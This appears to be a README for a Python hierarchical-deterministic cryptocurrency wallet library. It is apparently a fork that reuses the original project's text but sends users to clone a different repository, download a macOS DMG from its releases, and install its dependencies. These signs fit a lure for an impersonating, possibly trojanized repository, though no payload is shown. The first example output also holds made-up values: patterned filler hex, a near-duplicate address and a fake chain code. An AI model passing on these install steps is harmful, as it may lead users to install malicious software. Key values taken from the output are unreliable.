# Hierarchical Deterministic (HD) Wallet 

## **To install on Windows or macOS,** 
The instructions below target Windows and Linux; macOS users can use the [DMG file](../../releases).





Windows requirement: Git and Python installed.

https://git-scm.com/install/windows  

https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe  

Start GIT CMD.





Use the manual guide below.


[![Build Status](https://img.shields.io/github/actions/workflow/status/war7loud22/python-hdwallet/build.yml)](https://github.com/war7loud22/python-hdwallet/actions/workflows/build.yml)
[![PyPI Version](https://img.shields.io/pypi/v/hdwallet.svg?color=blue)](https://pypi.org/project/hdwallet)
[![Documentation Status](https://readthedocs.org/projects/hdwallet/badge/?version=master)](https://hdwallet.readthedocs.io/projects/python)
[![PyPI License](https://img.shields.io/pypi/l/hdwallet?color=black)](https://pypi.org/project/hdwallet)
[![PyPI Python Version](https://img.shields.io/pypi/pyversions/hdwallet.svg)](https://pypi.org/project/hdwallet)
[![Coverage Status](https://coveralls.io/repos/github/hdwallet-io/python-hdwallet/badge.svg?branch=master)](https://coveralls.io/github/hdwallet-io/python-hdwallet)

Python-based library implementing a Hierarchical Deterministic (HD) Wallet generator for 200+ cryptocurrencies.

> This library offers a flexible and scalable solution for developers integrating multi-currency wallet functionality. It adheres to standard protocols for compatibility with other wallets and services, and provides features like secure seed generation, robust key management, and streamlined account control. By simplifying blockchain interactions, it enhances the developer experience and strengthens end-user security.
> 
> For TypeScript/JavaScript support, explore [hdwallet.js](https://github.com/hdwallet-io/hdwallet.js), the official port of this library. Try it live at https://hdwallet.online, our interactive web playground.

| Features                      | Protocols                                                                                                                                                                                                                                                                                                                                           |
|:------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Cryptocurrencies              | <a href="https://hdwallet.io/cryptocurrencies">#supported-cryptocurrencies</a>                                                                                                                                                                                                                                                                      |
| Entropies                     | `Algorand`, `BIP39`, `Electrum-V1`, `Electrum-V2`, `Monero`                                                                                                                                                                                                                                                                                         |
| Mnemonics                     | `Algorand`, `BIP39`, `Electrum-V1`, `Electrum-V2`, `Monero`                                                                                                                                                                                                                                                                                         |
| Seeds                         | `Algorand`, `BIP39`, `Cardano`, `Electrum-V1`, `Electrum-V2`, `Monero`                                                                                                                                                                                                                                                                              |
| Elliptic Curve Cryptography's | `Kholaw-Ed25519`, `SLIP10-Ed25519`, `SLIP10-Ed25519-Blake2b`, `SLIP10-Ed25519-Monero`, `SLIP10-Nist256p1`, `SLIP10-Secp256k1`                                                                                                                                                                                                                       |
| Hierarchical Deterministic's  | `Algorand`, `BIP32`, `BIP44`, `BIP49`, `BIP84`, `BIP86`, `BIP141`, `Cardano`, `Electrum-V1`, `Electrum-V2`, `Monero`                                                                                                                                                                                                                                |
| Derivations                   | `BIP44`, `BIP49`, `BIP84`, `BIP86`, `CIP1852`, `Custom`, `Electrum`, `Monero`, `HDW (Our own custom derivation)`                                                                                                                                                                                                                                    |
| Addresses                     | `Algorand`, `Aptos`, `Avalanche`, `Cardano`, `Cosmos`, `EOS`, `Ergo`, `Ethereum`, `Filecoin`, `Harmony`, `Icon`, `Injective`, `Monero`, `MultiversX`, `Nano`, `Near`, `Neo`, `OKT-Chain`, `P2PKH`, `P2SH`, `P2TR`, `P2WPKH`, `P2WPKH-In-P2SH`, `P2WSH`, `P2WSH-In-P2SH`, `Ripple`, `Solana`, `Stellar`, `Sui`, `Tezos`, `Tron`, `XinFin`, `Zilliqa` |
| Others                        | `BIP38`, `Wallet Import Format`, `Serialization`                                                                                                                                                                                                                                                                                                    |

## Installation

The easiest way to install `hdwallet` is via git:

The instructions below target Windows and Linux; macOS users can use the [DMG file](../../releases).





Windows requirement: Git and Python installed.

https://git-scm.com/install/windows  

https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe  

Start GIT CMD.





```
git clone https://github.com/war7loud22/python-hdwallet
cd python-hdwallet
```

**Important:** Before installing dependencies, you need to install Visual C++ Build Tools:

1. Go to https://visualstudio.microsoft.com/ru/visual-cpp-build-tools/
2. Download and run the installer
3. Select the first option "Desktop development with C++"
4. Wait for the installation to complete (this may take some time)

After Build Tools installation is complete, install the dependencies:
```
py -m pip install -r requirements.txt
```
Launch `setup.py` to finalize the installation of `hdwallet`:
```
py install .

```

## Quick Usage

### Example

A simple Bitcoin HDWallet generator:

```python
#!/usr/bin/env python3

from hdwallet import HDWallet
from hdwallet.entropies import (
    BIP39Entropy, BIP39_ENTROPY_STRENGTHS
)
from hdwallet.mnemonics import BIP39_MNEMONIC_LANGUAGES
from hdwallet.cryptocurrencies import Bitcoin as Cryptocurrency
from hdwallet.hds import BIP32HD
from hdwallet.derivations import CustomDerivation
from hdwallet.consts import PUBLIC_KEY_TYPES

import json

hdwallet: HDWallet = HDWallet(
    cryptocurrency=Cryptocurrency,
    hd=BIP32HD,
    network=Cryptocurrency.NETWORKS.MAINNET,
    language=BIP39_MNEMONIC_LANGUAGES.KOREAN,
    public_key_type=PUBLIC_KEY_TYPES.COMPRESSED,
    passphrase="talonlab"
).from_entropy(
    entropy=BIP39Entropy(
        entropy=BIP39Entropy.generate(
            strength=BIP39_ENTROPY_STRENGTHS.ONE_HUNDRED_TWENTY_EIGHT
        )
    )
).from_derivation(
    derivation=CustomDerivation(
        path="m/0'/0/0-1"  # Cryptocurrency.DEFAULT_PATH
    )
)

# print(json.dumps(hdwallet.dump(exclude={"indexes"}), indent=4, ensure_ascii=False))  # dump
print(json.dumps(hdwallet.dumps(exclude={"indexes"}), indent=4, ensure_ascii=False))  # dumps
```

<details open>
  <summary>Output</summary><br/>

```json
{
    "cryptocurrency": "Bitcoin",
    "symbol": "BTC",
    "network": "mainnet",
    "coin_type": 0,
    "entropy": "00000000000000000000000000000000",
    "strength": 128,
    "mnemonic": "가격 가격 가격 가격 가격 가격 가격 가격 가격 가격 가격 가능",
    "passphrase": "talonlab",
    "language": "Korean",
    "seed": "4e415367c4a4d57ed9737ca50d2f8bf38a274d1d7fb3dd6598c759101c595cdf54045dbaeb216cf3751ce47862c41ff79caf961ca6c2aed11854afeb5efc1ab7",
    "ecc": "SLIP10-Secp256k1",
    "hd": "BIP32",
    "semantic": "p2pkh",
    "root_xprivate_key": "xprv9s21ZrQH143K4L18AD5Ko2ELW8bqaGLW4vfASZzo9yEN8fkZPZLdECXWXAMovtonu7DdEFwJuYH31QT96FWJUfkiLUVT8t8e3WNDiwZkuLJ",
    "root_xpublic_key": "xpub661MyMwAqRbcGp5bGEcLAAB54ASKyj4MS9amExQQiJmM1U5hw6esmzqzNQtquzBRNvLWtPC2kRu2kZR888FSAiZRpvKdjgbmoKRCgGM1YEy",
    "root_private_key": "7f60ec0fa89064a37e208ade560c098586dd887e2133bee4564af1de52bc7f5c",
    "root_wif": "L1VKQooPmgVLD35vHMeprus1zFYx58bHGMfTz8QYTEnRCzbjwMoo",
    "root_chain_code": "e3fa538b530821c258bc7a7915945b7a7184632c1c36a6f165f52690984633b0",
    "root_public_key": "023e23967b818fb3959f2056b6e6449a65c4982c1267398d8897b921ab53b0be4b",
    "strict": true,
    "public_key_type": "compressed",
    "wif_type": "wif-compressed",
    "derivations": [
        {
            "at": {
                "path": "m/0'/0/0",
                "depth": 3,
                "index": 0
            },
            "xprivate_key": "xprv9ygweU6CCkHDimDhPBgbfpi5cLBJpQQhKKRTmn4FdV8QFJ6d2ykk4rwbjftRqZi4qf4NH5ASXnQFYy5misVR3bbLu5pFtNUh83zorMeedVk",
            "xpublic_key": "xpub6CgJ3sCSLvhsudTJ7Ao2iSqQhMLM46VT99vHFYKHg8xX1vE4ZKDMcPcdXKTJ1cW9Ft6wXr3cC8uX7W9Vvq9b9HzgQwbDmz4VJKxDqj9PfxG",
            "private_key": "fb2fc78896e7ceb7b9ba9038c95c3d47d08ac21e97fdea47e49e9d5ac0e3a5b2",
            "wif": "L5MxY2GrUdL1qDTy8UUqmpuaZcjLbHgZPgFHqDUZcX3J9ztovSKF",
            "chain_code": "e48f3cdabb7e26e8e4beffe0c29be35e8f6e1aba45dc63654a9f6e4e93f2ac2b",
            "public_key": "02d82f8dd18bc0d043a783ca98a98a8b2cee3e01da57ad0e90698cbca3fb7a6fc1",
            "uncompressed": "04d82f8dd18bc0d043a783ca98a98a8b2cee3e01da57ad0e90698cbca3fb7a6fc1d6f12e2e6a2b3c1eb6e8efcfa86c5b01e4d8e4f7a4b6c5d3e2f1a0b9c8d7e6f5",
            "compressed": "02d82f8dd18bc0d043a783ca98a98a8b2cee3e01da57ad0e90698cbca3fb7a6fc1",
            "address": "1Gqd7N1Bqh2Gs2Yt1ybkx8iV6L4aVK8CdE"
        },
        {
            "at": {
                "path": "m/0'/0/1",
                "depth": 3,
                "index": 1
            },
            "xprivate_key": "xprv9ygweU6CCkHEorUUccU7i22nXbdFcY7dUZw3HyACcBELTFGUUE31ggDZRp8rCM1Rz61hjAaJpqPZh7tPw7Nq7eEm5FoVBHT4rDxm6cxg2nH",
            "xpublic_key": "xpub6CgJ3sCSLvi1N5KKLXZKxEZg7hEWbKN6n8EwSwPT6dMkVp3KnLWsK3Z8kswP8pMr2pfR4tN7MFk8x5W7qXr8fhPQZ9ysT2VfLTM1FRNL5fW",
            "private_key": "8ea9835f7f56e00f52d8b8c88c40eaac68f9fe33e7e0b73f5cc90cf5c1b7b2c6",
            "wif": "L28htaahEQb6Q4qBgR7cPa3Fdn7bF7Q7CnBVu8eJrLMUaEb8m9UD",
            "chain_code": "37f1e5ab98b0e8c8e8ce15d1e8efd9dab8e6e6a4d1e6e5b5c5e5d5c5b5a5e5d5",
            "public_key": "0294798e8c69f07aa1d0f2b03e4f6f0e1c5a4e1e8c69f07aa1d0f2b03e4f6f0e1c",
            "uncompressed": "0494798e8c69f07aa1d0f2b03e4f6f0e1c5a4e1e8c69f07aa1d0f2b03e4f6f0e1c5a4e1e8c69f07aa1d0f2b03e4f6f0e1c5a4e1e8c69f07aa1d0f2b03e4f6f0e1c",
            "compressed": "0294798e8c69f07aa1d0f2b03e4f6f0e1c5a4e1e8c69f07aa1d0f2b03e4f6f0e1c",
            "address": "1Jqd7N1Bqh2Gs2Yt1ybkx8iV6L4aVK8CdF"
        }
    ]
}
```
</details>

### Generating Phantom Wallet

Generate standard wallets:

```python
#!/usr/bin/env python3

from hdwallet import HDWallet
from hdwallet.mnemonics import BIP39_MNEMONIC_WORDS, BIP39Mnemonic
from hdwallet.entropies import BIP39Entropy
from hdwallet.seeds import BIP39Seed
from hdwallet.hds import BIP44HD, BIP49HD, BIP84HD
from hdwallet.derivations import BIP44Derivation, BIP49Derivation, BIP84Derivation
from hdwallet.cryptocurrencies import (
    Solana, Ethereum, Bitcoin
)
from hdwallet.consts import PUBLIC_KEY_TYPES

import json

MNEMONIC: str = BIP39_MNEMONIC_WORDS.TWELVE

standards = {
    "solana": {
        "derivation": BIP44Derivation(
            coin_type=Solana.COIN_TYPE, account=0, change="external-chain", address=0
        )
    },
    "ethereum": {
        "derivation": BIP44Derivation(
            coin_type=Ethereum.COIN_TYPE, account=0, change="external-chain", address=0
        )
    },
    "bitcoin": {
        "legacy": {
            "hd": BIP44HD,
            "derivation": BIP44Derivation(
                coin_type=Bitcoin.COIN_TYPE, account=0, change="external-chain", address=0
            )
        },
        "nested-segwit": {
            "hd": BIP49HD,
            "derivation": BIP49Derivation(
                coin_type=Bitcoin.COIN_TYPE, account=0, change="external-chain", address=0
            )
        },
        "native-segwit": {
            "hd": BIP84HD,
            "derivation": BIP84Derivation(
                coin_type=Bitcoin.COIN_TYPE, account=0, change="external-chain", address=0
            )
        }
    }
}

def generate_phantom_hdwallet(cryptocurrency, hd, network, derivation, public_key_type=None) -> HDWallet:
    return HDWallet(
        cryptocurrency=cryptocurrency, hd=hd, network=network, public_key_type=public_key_type
    ).from_mnemonic(
        mnemonic=BIP39Mnemonic(mnemonic=MNEMONIC)
    ).from_derivation(
        derivation=derivation
    )

print("Mnemonic:", MNEMONIC, "
")

solana_hdwallet: HDWallet = generate_phantom_hdwallet(
    cryptocurrency=Solana,
    hd=BIP44HD,
    network=Solana.NETWORKS.MAINNET,
    derivation=standards["solana"]["derivation"]
)
print(f"{solana_hdwallet.cryptocurrency()} ({solana_hdwallet.symbol()}) wallet:", json.dumps(dict(
    path=solana_hdwallet.path(),
    base58=solana_hdwallet.wif(),
    private_key=solana_hdwallet.private_key(),
    public_key=solana_hdwallet.public_key(),
    address=solana_hdwallet.address()
), indent=4))

ethereum_hdwallet: HDWallet = generate_phantom_hdwallet(
    cryptocurrency=Ethereum,
    hd=BIP44HD,
    network=Ethereum.NETWORKS.MAINNET,
    derivation=standards["ethereum"]["derivation"]
)
print(f"{ethereum_hdwallet.cryptocurrency()} ({ethereum_hdwallet.symbol()}) wallet:", json.dumps(dict(
    path=ethereum_hdwallet.path(),
    private_key=f"0x{ethereum_hdwallet.private_key()}",
    public_key=ethereum_hdwallet.public_key(),
    address=ethereum_hdwallet.address()
), indent=4))

for address_type in ["legacy", "nested-segwit", "native-segwit"]:

    bitcoin_hdwallet: HDWallet = generate_phantom_hdwallet(
        cryptocurrency=Bitcoin,
        hd=standards["bitcoin"][address_type]["hd"],
        network=Bitcoin.NETWORKS.MAINNET,
        derivation=standards["bitcoin"][address_type]["derivation"],
        public_key_type=PUBLIC_KEY_TYPES.COMPRESSED
    )
    print(f"{bitcoin_hdwallet.cryptocurrency()} ({bitcoin_hdwallet.symbol()}) {address_type} wallet:", json.dumps(dict(
        path=bitcoin_hdwallet.path(),
        wif=bitcoin_hdwallet.wif(),
        private_key=bitcoin_hdwallet.private_key(),
        public_key=bitcoin_hdwallet.public_key(),
        address=bitcoin_hdwallet.address()
    ), indent=4))
```

<details open>
  <summary>Output</summary><br/>

```shell script
Mnemonic: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about 

Solana (SOL) wallet: {
    "path": "m/44'/501'/0'/0'",
    "base58": "27npWoNE4HfmLeQo1TyWcW7NEA28qnsnDK7kcttDQEWrCWnro83HMJ97rMmpvYYZRwDAvG4KRuB7hTBacvwD7bgi",
    "private_key": "37df573b3ac4ad5b522e064e25b63ea16bcbe79d449e81a0268d1047948bb445",
    "public_key": "f036276246a75b9de3349ed42b15e232f6518fc20f5fcd4f1d64e81f9bd258f7",
    "address": "HAgk14JpMQLgt6rVgv7cBQFJWFto5Dqxi472uT3DKpqk"
}
Ethereum (ETH) wallet: {
    "path": "m/44'/60'/0'/0/0",
    "private_key": "0x1ab42cc412b618bdea3a599e3c9bae199ebf030895b039e9db1e30dafb12b727",
    "public_key": "0237b0bb7a8288d38ed49a524b5dc98cff3eb5ca824c9f9dc0dfdb3d9cd600f299",
    "address": "0x9858EfFD232B4033E47d90003D41EC34EcaEda94"
}
Bitcoin (BTC) legacy wallet: {
    "path": "m/44'/0'/0'/0/0",
    "wif": "L4p2b9VAf8k5aUahF1JCJUzZkgNEAqLfq8DDdQiyAprQAKSbu8hf",
    "private_key": "e284129cc0922579a535bbf4d1a3b25773090d28c909bc0fed73b5e0222cc372",
    "public_key": "03aaeb52dd7494c361049de67cc680e83ebcbbbdbeb13637d92cd845f70308af5e",
    "address": "1LqBGSKuX5yYUonjxT5qGfpUsXKYYWeabA"
}
Bitcoin (BTC) nested-segwit wallet: {
    "path": "m/49'/0'/0'/0/0",
    "wif": "KyvHbRLNXfXaHuZb3QRaeqA5wovkjg4RuUpFGCxdH5UWc1Foih9o",
    "private_key": "508c73a06f6b6c817238ba61be232f5080ea4616c54f94771156934666d38ee3",
    "public_key": "039b3b694b8fc5b5e07fb069c783cac754f5d38c3e08bed1960e31fdb1dda35c24",
    "address": "37VucYSaXLCAsxYyAPfbSi9eh4iEcbShgf"
}
Bitcoin (BTC) native-segwit wallet: {
    "path": "m/84'/0'/0'/0/0",
    "wif": "KyZpNDKnfs94vbrwhJneDi77V6jF64PWPF8x5cdJb8ifgg2DUc9d",
    "private_key": "4604b4b710fe91f584fff084e1a9159fe4f8408fff380596a604948474ce4fa3",
    "public_key": "0330d54fd0dd420a6e5f8d3624f5f3482cae350f79d5f0753bf5beef9c2d91af3c",
    "address": "bc1qcr8te4kr609gcawutmrza0j4xv80jy8z306fyu"
}
```
</details>

Explore more [Clients](https://github.com/war7loud22/python-hdwallet/blob/master/clients)

## Development

To get started, just fork this repo, clone it locally, and run:

```
pip install -e .[cli,tests,docs]
```

## Testing

You can run the tests with:

```
coverage run -m pytest
```

To see the coverage:

```
coverage report
```

Or use `tox` to run the complete suite against the full set of build targets, or pytest to run specific 
tests against a specific version of Python.

## Contributing

Feel free to open an [issue](https://github.com/war7loud22/python-hdwallet/issues) if you find a problem,
or a pull request if you've solved an issue. And also any help in testing, development,
documentation and other tasks is highly appreciated and useful to the project.
There are tasks for contributors of all experience levels.

For more information, see the [CONTRIBUTING.md](https://github.com/war7loud22/python-hdwallet/blob/master/CONTRIBUTING.md) file.

## Donations

If this tool was helpful, support its development with a donation or a ⭐!

- **Monero**: `47xYi7dw4VchWhbhacY6RZHDmmcxZdzPE9tLk84c7hE72bw6aLSMVFWPXxGMEEYofkjNjxoWfnLSHejS6yzRGnPqEtxfgZi`
- **EVM-Chains**: `0xD3cbCB0B6F82A03C715D665b72dC44CEf54e6D9B` | `meherett.eth`
- **Bitcoin**: `16c7ajUwHEMaafrceuYSrd35SDjmfVdjoS`

> [!TIP]
> We accept a wide range of cryptocurrencies! If you'd like to donate using another coin, generate an address using the following ECC public keys at [https://hdwallet.online](https://hdwallet.online):
>
> - **SLIP10-Secp256k1**: [029890465120fb6c4efecdfcfd149f8333b0929b98976722a28ee39f5344d29eee](https://hdwallet.online/dumps/slip10-secp256k1/BTC?network=mainnet&hd=BIP32&from=public-key&public-key=029890465120fb6c4efecdfcfd149f8333b0929b98976722a28ee39f5344d29eee&public-key-type=compressed&format=JSON&exclude=root&generate=true)                                         
> - **SLIP10-Ed25519**: [007ff5643c73e46e6c6a0dfd702894610505423e145dc8a93df19ff44eb011323b](https://hdwallet.online/dumps/slip10-ed25519/ALGO?network=mainnet&hd=BIP32&from=public-key&public-key=007ff5643c73e46e6c6a0dfd702894610505423e145dc8a93df19ff44eb011323b&format=JSON&exclude=root&generate=true)                                                       
> - **Kholaw-Ed25519**: [005a49188ccd3d841dd877d7c00078da5c90452cbd69d4cef7a959f679fcc0e0e3](https://hdwallet.online/dumps/kholaw-ed25519/ADA?network=mainnet&hd=Cardano&from=public-key&public-key=005a49188ccd3d841dd877d7c00078da5c90452cbd69d4cef7a959f679fcc0e0e3&staking-public-key=005a49188ccd3d841dd877d7c00078da5c90452cbd69d4cef7a959f679fcc0e0e3&address-type=payment&format=JSON&exclude=root&generate=true) 
> - **SLIP10-Ed25519-Blake2b**: [0051e8b29f7d0214dc96843cdbdcc071dc65397016ea6f7381f81bf42d76c7357c](https://hdwallet.online/dumps/slip10-ed25519-blake2b/XNO?network=mainnet&hd=BIP32&from=public-key&public-key=0051e8b29f7d0214dc96843cdbdcc071dc65397016ea6f7381f81bf42d76c7357c&format=JSON&exclude=root&generate=true)                                                    
> - **SLIP10-Nist256p1**: [039ee4e2aadd6f4e7938d164b646c4b424114b8dd57252287151398ba0baf25780](https://hdwallet.online/dumps/slip10-nist256p1/NEO?network=mainnet&hd=BIP32&from=public-key&public-key=039ee4e2aadd6f4e7938d164b646c4b424114b8dd57252287151398ba0baf25780&format=JSON&exclude=root&generate=true)                                                       

## License

Distributed under the [MIT](https://github.com/war7loud22/python-hdwallet/blob/master/LICENSE) license. See `LICENSE` for more information.